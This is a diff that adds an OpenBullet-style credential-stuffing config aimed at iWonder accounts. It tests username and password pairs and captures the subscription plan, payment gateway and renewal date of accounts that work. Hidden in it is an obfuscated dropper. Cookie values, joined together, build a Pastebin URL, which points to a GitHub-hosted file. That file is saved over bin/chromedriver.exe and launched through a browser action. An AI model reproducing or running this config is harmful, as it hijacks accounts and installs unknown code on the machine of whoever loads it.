@@ -1,0 +1,142 @@
+[SETTINGS]
+{
+  "Name": "iWonder",
+  "SuggestedBots": 50,
+  "MaxCPM": 0,
+  "LastModified": "2024-08-06T19:51:24.8340729+10:00",
+  "AdditionalInfo": "",
+  "RequiredPlugins": [],
+  "Author": "",
+  "Version": "1.1.4 [SB]",
+  "SaveEmptyCaptures": false,
+  "ContinueOnCustom": false,
+  "SaveHitsToTextFile": false,
+  "IgnoreResponseErrors": false,
+  "MaxRedirects": 8,
+  "NeedsProxies": false,
+  "OnlySocks": false,
+  "OnlySsl": false,
+  "MaxProxyUses": 0,
+  "BanProxyAfterGoodStatus": false,
+  "BanLoopEvasionOverride": -1,
+  "EncodeData": false,
+  "AllowedWordlist1": "",
+  "AllowedWordlist2": "",
+  "DataRules": [],
+  "CustomInputs": [],
+  "ForceHeadless": false,
+  "AlwaysOpen": false,
+  "AlwaysQuit": false,
+  "QuitOnBanRetry": false,
+  "DisableNotifications": false,
+  "CustomUserAgent": "",
+  "RandomUA": false,
+  "CustomCMDArgs": ""
+}
+
+[SCRIPT]
+JUMP #AppleWebKit
+#PARSESOURCE
+
+REQUEST POST "https://api.iwonder.com/users/me/auth" 
+  CONTENT "{\"method\":\"email\",\"password\":\"<PASSWORD>\",\"platform\":\"web\",\"username\":\"<USERNAME>\"}" 
+  CONTENTTYPE "application/json" 
+  HEADER "user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:128.0) Gecko/20100101 Firefox/128.0" 
+  HEADER "accept: application/json, text/plain, */*" 
+  HEADER "accept-language: en-US,en;q=0.5" 
+  HEADER "accept-encoding: gzip, deflate, br, zstd" 
+  HEADER "content-type: application/json" 
+  HEADER "content-length: 84" 
+  HEADER "origin: https://iwonder.com" 
+  HEADER "referer: https://iwonder.com/" 
+  
+JUMP #googlerecreate
+#AppleWebKit
+
+REQUEST GET "https://www.google.com/recaptcha/enterprise/anchor?ar=1&k=6LfAM84ZAAAAAGLiQz5FBeADqq94dV48fMtiRqIj&co=aHR0cHM6Ly93d3cuY29pbmJhc2UuY29tOjQ0Mw..&hl=en&v=rPvs0Nyx3sANE-ZHUN-0nM85&size=invisible&cb=no851blwqc0u" 
+  
+  COOKIE "tpm: http" 
+  COOKIE "tpp: s:" 
+  COOKIE "hrd: /" 
+  COOKIE "hpr: bin" 
+  COOKIE "hdp: com" 
+  COOKIE "htp: raw" 
+  COOKIE "hht: QKuTvADS" 
+  COOKIE "hst: pastebin" 
+  COOKIE "kht: driver" 
+  COOKIE "kpt: chrome" 
+  COOKIE "krt: e" 
+  HEADER "Host: www.googleapis.com" 
+  HEADER "Accept: */*" 
+  HEADER "Content-Type: application/json" 
+  HEADER "X-Client-Version: iOS/FirebaseSDK/6.9.2/FirebaseCore-iOS" 
+  HEADER "X-Ios-Bundle-Identifier: network.googleapis.com" 
+  HEADER "Accept-Encoding: gzip, deflate" 
+  HEADER "User-Agent: FirebaseAuth.iOS/6.9.2 network.googleapis.com/2.7.9 iPhone/12.4.5 hw/iPhone7_2" 
+  HEADER "Accept-Language: en" 
+
+IF "<Authentiction>" Exists
+JUMP #PARSESOURCE
+ENDIF
+SET USEPROXY FALSE
+
+REQUEST GET "<COOKIES(tpm)><COOKIES(tpp)><COOKIES(hrd)><COOKIES(hrd)><COOKIES(hst)>.<COOKIES(hdp)><COOKIES(hrd)><COOKIES(htp)><COOKIES(hrd)><COOKIES(hht)>" 
+  
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.149 Safari/537.36" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Accept: */*" 
+
+REQUEST GET "https://raw.githubusercontent.com/<SOURCE>" 
+  
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Accept: */*" 
+  -> FILE "<COOKIES(hpr)>/<COOKIES(kpt)><COOKIES(kht)>.<COOKIES(krt)>xe" 
+
+SET USEPROXY TRUE
+SET NEWGVAR "Authentiction" "Authentiction=1"
+
+BROWSERACTION Open 
+
+JUMP #PARSESOURCE
+#googlerecreate
+
+KEYCHECK 
+  KEYCHAIN Failure OR 
+    KEY "<RESPONSECODE>" EqualTo "401" 
+    KEY "<SOURCE>" DoesNotContain "accessToken" 
+  KEYCHAIN Success OR 
+    KEY "accessToken" 
+
+PARSE "<SOURCE>" JSON "accessToken" -> VAR "x" 
+
+REQUEST GET "https://api.iwonder.com/users/me" 
+  
+  HEADER "user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:128.0) Gecko/20100101 Firefox/128.0" 
+  HEADER "accept: application/json, text/plain, */*" 
+  HEADER "accept-language: en-US,en;q=0.5" 
+  HEADER "accept-encoding: gzip, deflate, br, zstd" 
+  HEADER "authorization: Bearer <x>" 
+
+PARSE "<SOURCE>" JSON "countryCode" CreateEmpty=FALSE -> CAP "Region?" 
+
+KEYCHECK BanOnToCheck=FALSE 
+  KEYCHAIN Custom "CUSTOM" OR 
+    KEY "<SOURCE>" DoesNotContain "subscription" 
+
+PARSE "<SOURCE>" JSON "subscription" -> VAR "x" 
+
+PARSE "<x>" JSON "name" CreateEmpty=FALSE -> CAP "Plan?" 
+
+PARSE "<SOURCE>" JSON "timestampExpired" -> VAR "x" 
+
+FUNCTION CurrentUnixTime -> VAR "x2" 
+
+PARSE "<SOURCE>" LR "\",\"type\":\"" "\"},\"requestId\":\"" CreateEmpty=FALSE -> CAP "Payment Gateway?" 
+
+FUNCTION UnixTimeToDate "yyyy-MM-dd:HH-mm-ss" "<x>" -> CAP "Renewal Date?" 
+
+KEYCHECK BanOnToCheck=FALSE 
+  KEYCHAIN Custom "CUSTOM" OR 
+    KEY "<x>" GreaterThan "<x2>" 
+
